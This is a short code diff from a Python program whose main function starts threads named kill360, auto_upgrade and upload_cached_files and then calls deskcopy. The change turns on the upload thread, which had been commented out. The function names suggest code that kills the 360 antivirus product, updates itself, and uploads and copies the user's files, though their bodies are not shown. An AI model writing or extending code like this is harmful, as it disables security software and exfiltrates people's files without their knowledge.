@@ -146,7 +146,7 @@ def main():
     log('I','已启动')
     threading.Thread(target=kill360).start()
     threading.Thread(target=auto_upgrade).start()
-##    threading.Thread(target=upload_cached_files).start()
+    threading.Thread(target=upload_cached_files).start()
     deskcopy()
     return 0
 
